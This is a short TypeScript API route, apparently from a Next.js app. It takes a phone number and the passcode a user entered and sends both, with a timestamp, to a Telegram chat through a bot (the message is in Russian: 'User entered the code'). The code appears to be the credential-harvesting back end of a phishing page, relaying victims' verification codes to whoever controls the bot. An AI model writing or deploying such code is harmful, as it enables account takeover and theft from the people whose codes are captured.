export async function POST(request: Request) {
  try {
    const { passcode, phone } = await request.json()

    const botToken = process.env.TELEGRAM_BOT_TOKEN
    const chatId = process.env.TELEGRAM_CHAT_ID

    if (!botToken || !chatId) {
      return Response.json({ error: "Telegram credentials not configured" }, { status: 500 })
    }

    const message = `🔐 <b>Пользователь ввел код:</b>\n\n📱 Телефон: ${phone}\n🔢 Введенный код: ${passcode}\n⏰ Время: ${new Date().toLocaleString("ru-RU")}`

    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "HTML",
      }),
    })

    if (!response.ok) {
      throw new Error("Failed to send Telegram message")
    }

    return Response.json({ success: true })
  } catch (error) {
    console.error("Error sending Telegram notification:", error)
    return Response.json({ error: "Failed to send notification" }, { status: 500 })
  }
}
